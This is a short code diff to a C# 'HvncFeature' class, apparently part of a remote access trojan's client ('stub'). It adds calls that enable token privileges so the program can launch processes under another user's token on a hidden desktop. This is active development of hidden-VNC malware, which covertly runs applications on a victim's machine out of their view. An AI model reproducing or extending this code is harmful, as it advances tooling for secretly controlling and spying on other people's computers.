@@ -2160,9 +2160,17 @@ internal static class HvncFeature
             if (launchToken != 0) CreateEnvironmentBlock(out envBlock, launchToken, false);
             PROCESS_INFORMATION pi;
             if (launchToken != 0)
+            {
+                // CreateProcessAsUserW requires these privileges to be active in the caller's token.
+                // They are present in elevated-admin tokens but not enabled by default.
+                Protection.EnablePrivilege(3);  // SeAssignPrimaryTokenPrivilege
+                Protection.EnablePrivilege(5);  // SeIncreaseQuotaPrivilege
                 CreateProcessAsUserW(launchToken, 0, sb, 0, 0, false, createFlags, envBlock, 0, ref si, out pi);
+            }
             else
+            {
                 CreateProcessW(0, sb, 0, 0, false, createFlags, 0, 0, ref si, out pi);
+            }
             if (envBlock    != 0) DestroyEnvironmentBlock(envBlock);
             if (launchToken != 0) CloseHandle(launchToken);
             StubLog.Info($"[HVNC] LaunchOnDesktop '{path}' pid={pi.dwProcessId}");
